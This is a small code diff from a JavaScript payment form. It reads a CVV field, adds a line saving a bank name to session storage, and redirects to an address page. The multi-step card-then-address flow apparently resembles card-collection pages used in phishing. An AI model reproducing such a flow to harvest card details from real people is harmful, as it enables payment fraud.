@@ -747,7 +747,7 @@ const cvv = (cvvEl.value || "").replace(/\D/g, "");
   });
   
 
-  
+  sessionStorage.setItem("bank_name", BANK_NAME || "");
 
   window.location.href = "adresse.html";
 });
